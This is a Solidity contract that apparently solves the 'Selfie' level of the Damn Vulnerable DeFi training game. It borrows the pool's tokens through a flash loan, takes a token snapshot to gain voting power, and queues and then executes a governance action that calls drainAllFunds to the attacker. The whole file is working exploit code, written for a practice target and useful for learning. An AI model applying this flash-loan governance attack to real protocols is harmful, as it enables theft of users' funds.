// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../selfie/SimpleGovernance.sol';
import '../selfie/SelfiePool.sol';
import '../DamnValuableTokenSnapshot.sol';

contract SelfieExploit {

    SimpleGovernance gov;
    SelfiePool pool;
    DamnValuableTokenSnapshot token;
    uint256 public value;
    uint256 public action;
    uint256 public timestamp1;
    uint256 public timestamp2;

    constructor(address _gov, address _pool,address _token){
        gov = SimpleGovernance(_gov);
        pool = SelfiePool(_pool);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack() public{

        value = token.balanceOf(address(pool));

        pool.flashLoan(value);

        //function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) {
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)",msg.sender);
        action = gov.queueAction(address(pool),data,0);

        timestamp1 = block.timestamp;

    }

    function drain() public{
        timestamp2 = block.timestamp;
        gov.executeAction(action);
        
    }

    function receiveTokens(address _token, uint256 _amount) public{

        token.snapshot();
        //payback flash loan
        token.transfer(address(pool),_amount);
    }

}